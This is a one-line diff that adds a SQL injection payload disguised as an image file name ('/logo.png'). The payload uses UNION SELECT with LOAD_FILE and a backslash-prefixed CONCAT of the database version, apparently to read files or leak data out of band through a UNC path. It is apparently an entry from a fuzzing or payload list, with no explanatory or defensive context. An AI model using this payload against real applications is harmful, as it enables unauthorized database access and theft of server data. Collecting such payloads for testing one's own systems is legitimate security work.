@@ -1,0 +1,1 @@
+/logo.png' UNION SELECT LOAD_FILE(CONCAT(0x5c,(SELECT+version())))-- -
